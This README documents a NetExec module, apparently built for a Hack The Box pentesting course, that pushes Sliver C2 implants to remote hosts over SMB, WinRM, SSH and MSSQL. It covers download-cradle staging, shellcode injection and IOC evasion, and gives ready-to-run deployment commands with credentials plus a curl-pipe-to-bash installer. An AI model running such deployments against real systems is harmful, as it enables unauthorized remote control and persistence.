
# Sliver NetExec Module

[![](https://github.com/moerketh/sliver-netexec-module/actions/workflows/test.yml/badge.svg?branch=main)](https://github.com/moerketh/sliver-netexec-module/actions/workflows/test.yml)

A NetExec (formerly CrackMapExec) module that deploys Sliver C2 implants to remote Windows and Linux targets via multiple protocols (SMB, WinRM, SSH, MSSQL).

## Features

### Core Features

- **Multi-Protocol Support**: SMB, WinRM, SSH, MSSQL
- **Automatic OS/Architecture Detection**: Detects from connection metadata
- **Unique Implants**: Generates unique implant per target (reduces IOC correlation)
- **Configurable Options**: Beacon intervals, cleanup, wait times, staging methods
- **Profile Support**: Use pre-configured Sliver profiles for consistent deployments
- **Cross-Platform**: Deploy to Windows and Linux targets

### Deployment Modes

1. **Direct Implant Upload**
   - Uploads full implant binary directly to target
   - Works with all protocols (SMB, WinRM, SSH, MSSQL)
   - Simple, reliable, ~17MB payload upload

2. **HTTP Download Staging**
   - Executes tiny download cradle (~200 bytes) on target
   - Target downloads implant from Sliver-hosted HTTP server
   - Three download methods: PowerShell, certutil, BITSAdmin
   - Automatic cleanup of HTTP listener and website

3. **TCP/HTTP Shellcode Injection**
   - In-memory shellcode injection
   - Two-stage: bootstrap shellcode + full implant
   - WinRM protocol only

## Requirements

- NetExec (nxc) installed
- Sliver C2 server running
- Valid Sliver client configuration

## Architecture

### Lazy Loading of Protobuf Dependencies

This module uses lazy loading for Sliver protobuf bindings to ensure compatibility with NetExec's module discovery system. When NetExec lists available modules (e.g., `nxc smb -L`), it imports each module to extract metadata like descriptions and options. Since NetExec's environment doesn't include Sliver protobuf bindings, the module must be importable without immediately requiring these dependencies.

**Why lazy loading is necessary:**

- **NetExec compatibility**: NetExec environments don't include Sliver protobuf bindings, so modules must be importable for listing without external dependencies
- **Module discovery**: Allows NetExec to load module metadata without triggering protobuf imports
- **Path isolation**: Uses protobuf bindings from the module's local `src/` directory rather than requiring system-wide installation

**Performance context:**

The original test slowdown (~116s collection time) was caused by including the full NetExec environment in the project's development venv, not by protobuf loading overhead. Lazy loading here serves compatibility rather than performance optimization.

## Installation

### Prerequisited

Install Sliver
```bash
curl https://sliver.sh/install | sudo bash
cp ~/.sliver-client/configs/${USER}_localhost.cfg ~/.sliver-client/configs/default.cfg
```

*Tip*: Add a bypass to proxychains to be able to reach the Sliver Server
```bash
echo "localnet 127.0.0.0/255.0.0.0" | sudo tee -a /etc/proxychains.conf
```

### Quick Install

Run the installation script to build and install the module:

```bash
./scripts/install.sh
```

This script will:
- Check dependencies (Python 3.10+, pip, NetExec)
- Detect NetExec installation method (pipx, pip, apt)
- Build the wheel
- Install the module
- Verify the installation

For installation options and details, see `scripts/install.sh`.

### HTB Pwnbox Installation

Copy-paste commands for quick setup on HTB Pwnbox:

```bash
# 1. Install NetExec (if not already installed)
pipx install git+https://github.com/Pennyw0rth/NetExec

# 2. Clone and build the module
cd /tmp
git clone https://github.com/moerketh/sliver-netexec-module.git
cd sliver-netexec-module
poetry install
poetry build

# 3. Inject module into NetExec
pipx inject netexec dist/sliver_nxc_module-0.1.0-py3-none-any.whl

# 4. Verify installation
netexec smb -L | grep sliver_exec

# 5. Setup Sliver config
cp ~/.sliver-client/configs/${USER}_localhost.cfg ~/.sliver-client/configs/default.cfg
```

### Kali Linux Installation

Copy-paste commands for Kali Linux:

```bash
# 1. Install NetExec (if not already installed)
sudo apt update
sudo apt install -y netexec

# Or via pipx for latest version:
# sudo apt install -y pipx
# pipx install git+https://github.com/Pennyw0rth/NetExec

# 2. Clone and build the module
cd /tmp
git clone https://github.com/moerketh/sliver-netexec-module.git
cd sliver-netexec-module
poetry install
poetry build

# 3. Install module (choose based on NetExec installation)
# If NetExec installed via apt:
sudo pip3 install dist/sliver_nxc_module-0.1.0-py3-none-any.whl --break-system-packages

# If NetExec installed via pipx:
pipx inject netexec dist/sliver_nxc_module-0.1.0-py3-none-any.whl

# 4. Verify installation
netexec smb -L | grep sliver_exec

# 5. Setup Sliver config
cp ~/.sliver-client/configs/${USER}_localhost.cfg ~/.sliver-client/configs/default.cfg
```

## Quick Start

### Basic Usage - Direct Implant Upload

```bash
nxc smb 10.2.10.10 -u localuser -p password \
  -M sliver_exec \
  -o RHOST=192.168.1.100
```

*Note: `RPORT` defaults to 443 if not specified*

### HTTP Download Staging (Lightweight)

```bash
nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
  -M sliver_exec \
  -o RHOST=10.0.0.5 \
     STAGING=http STAGING_PORT=8080
```

*Note: `DOWNLOAD_TOOL` defaults to powershell, `STAGER_RHOST` defaults to `RHOST`*

**See [USAGE.md](docs/USAGE.md) for detailed examples and options.**

## Documentation

- **[Architecture](docs/ARCHITECTURE.md)** - Deployment modes, technical details, and workflow diagrams
- **[Usage Guide](docs/USAGE.md)** - Comprehensive examples for all deployment scenarios
- **[Configuration](#configuration)** - Sliver config setup (below)

## Key Options

| Option | Default | Description |
|--------|---------|-------------|
| `RHOST` | **Required*** | Sliver mTLS listener IP |
| `RPORT` | `443` | Sliver mTLS listener port (optional) |
| `STAGING` | `False` | Staging mode: `http`, `tcp`, `https`, or `False` to disable |
| `STAGER_RHOST` | `RHOST` | Staging server IP (defaults to same as RHOST) |
| `STAGING_PORT` | `8080` | HTTP port for hosting implant (HTTP download staging) |
| `DOWNLOAD_TOOL` | `powershell` | Download method: `powershell`, `certutil`, `bitsadmin`, `wget`, `curl`, `python` |
| `BEACON_INTERVAL` | `5` | Beacon callback interval in seconds |
| `BEACON_JITTER` | `3` | Beacon callback jitter in seconds |
| `OS` | Auto-detect | Target OS (`windows` or `linux`) |
| `ARCH` | `amd64` | Target architecture |
| `CLEANUP_MODE` | `always` | When to cleanup: `always`, `success` (only if beacon registers), or `never` |
| `WAIT` | `90` | Seconds to wait for beacon |

*\* Either `RHOST` or `PROFILE` must be provided*

**Note:** Old option names (`STAGER_PORT`, `STAGING_METHOD`, `STAGING=True`) are still supported for backward compatibility.

**Full option reference in [USAGE.md](docs/USAGE.md#advanced-options)**

## Configuration

The module requires a Sliver client configuration file at:
- `~/.sliver-client/configs/default.cfg`

To set it up:
```bash
cp ~/.sliver-client/configs/${USER}_localhost.cfg ~/.sliver-client/configs/default.cfg
```

You can specify a custom config path in your NetExec config:
```ini
[Sliver]
config_path = /path/to/your/sliver/config.cfg
```

## Requirements

- NetExec (nxc)
- Sliver C2 server (v1.6+)
- Valid Sliver client configuration
- Target credentials (Windows: admin, Linux: root/sudo, MSSQL: sysadmin)

## Testing

### Unit Tests
Run the unit test suite:
```bash
poetry run pytest tests/test_sliver_exec.py -v
```

All tests validate:
- Option validation
- OS/architecture detection
- Implant generation
- HTTP staging workflow
- Beacon waiting and cleanup

### End-to-End Tests
Verify the module is correctly installed in NetExec:
```bash
poetry run pytest tests/test_e2e.py -v
```

These tests verify:
- Module is discoverable in NetExec (`nxc smb -L`)
- Package contains all required files
- Module works across all protocols (SMB, WinRM, SSH, MSSQL)

### Integration Tests
Test against live Windows/Linux targets:

**Prerequisites:**
- Live target with credentials
- Sliver server running
- Environment variables configured

**Setup:**
```bash
export TARGET_HOST=<target_ip>
export TARGET_USER=<username>
export TARGET_PASS=<password>
export SLIVER_LISTENER_HOST=<listener_ip>  # Use 0.0.0.0 in devcontainer
```

**Run:**
```bash
poetry run pytest tests/test_integration.py -v --run-integration
```

See [INTEGRATION_TESTS.md](INTEGRATION_TESTS.md) for detailed setup instructions.

## Credits

This module was written as part of the **Active Directory Penetration Expert Course** on Hack The Box.

**AI Assistance**
This project was developed with significant contributions from AI coding assistants:
- **Claude** (Anthropic) - Opus, Sonnet, and Haiku models
- **Grok** (xAI) - Grok and Grok Code Fast models
These AI models assisted with architecture design, code implementation, debugging, documentation, and test development.
